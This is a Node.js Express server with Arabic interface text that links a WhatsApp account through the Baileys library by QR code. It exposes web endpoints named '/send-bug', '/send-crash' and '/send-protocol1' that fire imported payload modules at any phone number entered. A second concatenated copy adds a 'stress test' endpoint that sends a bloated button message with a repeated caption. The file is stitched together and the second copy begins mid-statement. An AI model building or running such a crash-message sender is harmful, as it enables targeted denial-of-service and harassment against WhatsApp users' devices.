const express = require('express');
const qrcode = require('qrcode');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const SESSION_FOLDER = './auth_info_baileys';
let sock;
let qrCodeString = '';

app.use(express.json());
app.use(express.static('public'));

// استدعاء الأوامر من مجلد commands
const bugCommand = require('./commands/bug');
const crashCommand = require('./commands/crash');
const protocolCommand = require('./commands/protocol1');

async function startSock() {
    const { state, saveCreds } = await useMultiFileAuthState(SESSION_FOLDER);

    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
    });

    sock.ev.on('connection.update', (update) => {
        const { qr, connection, lastDisconnect } = update;
        if (qr) {
            qrCodeString = qr;
            console.log('✅ امسح QR من المتصفح للاتصال');
        }
        if (connection === 'close') {
            const status = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (status === DisconnectReason.loggedOut) {
                console.log('❌ تم تسجيل الخروج، حذف الجلسة');
                fs.rmSync(SESSION_FOLDER, { recursive: true, force: true });
                startSock();
            } else {
                console.log('🔄 إعادة الاتصال...');
                startSock();
            }
        } else if (connection === 'open') {
            console.log('✅ متصل الآن');
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

startSock();

// ✅ عرض QR
app.get('/qr', async (req, res) => {
    if (!qrCodeString) return res.status(404).send('لا يوجد QR حاليا');
    try {
        const qrImage = await qrcode.toDataURL(qrCodeString);
        res.send(`<img src="${qrImage}" style="width:300px;"/>`);
    } catch {
        res.status(500).send('خطأ في إنشاء QR');
    }
});

// ✅ API للأوامر
app.post('/send-bug', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).send('أدخل الرقم');
    try {
        await bugCommand(sock, number);
        res.send('✅ أمر BUG تم تنفيذه بنجاح');
    } catch (err) {
        console.error(err);
        res.status(500).send('فشل تنفيذ أمر BUG');
    }
});

app.post('/send-crash', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).send('أدخل الرقم');
    try {
        await crashCommand(sock, number);
        res.send('✅ أمر CRASH تم تنفيذه بنجاح');
    } catch (err) {
        console.error(err);
        res.status(500).send('فشل تنفيذ أمر CRASH');
    }
});

app.post('/send-protocol1', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).send('أدخل الرقم');
    try {
        await protocolCommand(sock, number);
        res.send('✅ أمر PROTOCOL1 تم تنفيذه بنجاح');
    } catch (err) {
        console.error(err);
        res.status(500).send('فشل تنفيذ أمر PROTOCOL1');
    }
});

// ✅ واجهة بسيطة
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`🚀 شغال على http://localhost:${PORT}`)); express = require('express');
const qrcode = require('qrcode');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

const SESSION_FOLDER = './auth_info_baileys';
let sock;
let qrCodeString = '';

app.use(express.json());
app.use(express.static('public'));

async function startSock() {
    const { state, saveCreds } = await useMultiFileAuthState(SESSION_FOLDER);

    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
    });

    sock.ev.on('connection.update', (update) => {
        const { qr, connection, lastDisconnect } = update;
        if (qr) {
            qrCodeString = qr;
            console.log('✅ QR متاح، امسحه من المتصفح للربط');
        }
        if (connection === 'close') {
            const status = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (status === DisconnectReason.loggedOut) {
                console.log('❌ تم تسجيل الخروج، حذف الجلسة');
                fs.rmSync(SESSION_FOLDER, { recursive: true, force: true });
                startSock();
            } else {
                console.log('🔄 إعادة الاتصال...');
                startSock();
            }
        } else if (connection === 'open') {
            console.log('✅ متصل الآن');
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

startSock();

// ✅ عرض QR
app.get('/qr', async (req, res) => {
    if (!qrCodeString) return res.status(404).send('لا يوجد QR حاليا');
    try {
        const qrImage = await qrcode.toDataURL(qrCodeString);
        res.send(`<img src="${qrImage}" style="width:300px;"/>`);
    } catch {
        res.status(500).send('خطأ في إنشاء QR');
    }
});

// ✅ إرسال اختبار
app.post('/send-stress', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).send('أدخل الرقم');

    const jid = number.includes('@s.whatsapp.net') ? number : `${number}@s.whatsapp.net`;

    try {
        const buttons = [
            { buttonId: 'btn1', buttonText: { displayText: 'زر 1' }, type: 1 },
            { buttonId: 'btn2', buttonText: { displayText: 'زر 2' }, type: 1 },
            { buttonId: 'btn3', buttonText: { displayText: 'زر 3' }, type: 1 }
        ];

        const buttonMessage = {
            image: { url: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Cat03.jpg' },
            caption: '📢 اختبار التحمل\n'.repeat(30),
            footer: 'رسالة ثقيلة للأداء',
            buttons: buttons,
            headerType: 4,
        };

        await sock.sendMessage(jid, buttonMessage);
        res.send('✅ تم إرسال الرسالة بنجاح');
    } catch (err) {
        console.error(err);
        res.status(500).send('خطأ في الإرسال');
    }
});

// ✅ واجهة
app.get('/', (req, res) => {
    res.send(`
        <h1>اختبار تحمل واتساب</h1>
        <p>امسح رمز QR أدناه للاتصال:</p>
        <div id="qr">جاري تحميل QR...</div>
        <br/>
        <input type="text" id="number" placeholder="رقم واتساب (مثال: 9665xxxxxxx)" />
        <button onclick="sendStress()">إرسال اختبار التحمل</button>
        <p id="status"></p>
        <script>
            async function loadQR() {
                const qrDiv = document.getElementById('qr');
                const res = await fetch('/qr');
                qrDiv.innerHTML = res.ok ? await res.text() : 'لا يوجد QR حالياً';
            }
            loadQR();
            setInterval(loadQR, 5000);
            async function sendStress() {
                const number = document.getElementById('number').value.trim();
                if (!number) { alert('أدخل الرقم'); return; }
                const status = document.getElementById('status');
                status.textContent = 'جاري الإرسال...';
                const res = await fetch('/send-stress', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ number })
                });
                status.textContent = await res.text();
            }
        </script>
    `);
});

app.listen(PORT, () => console.log(`🚀 شغال على http://localhost:${PORT}`));
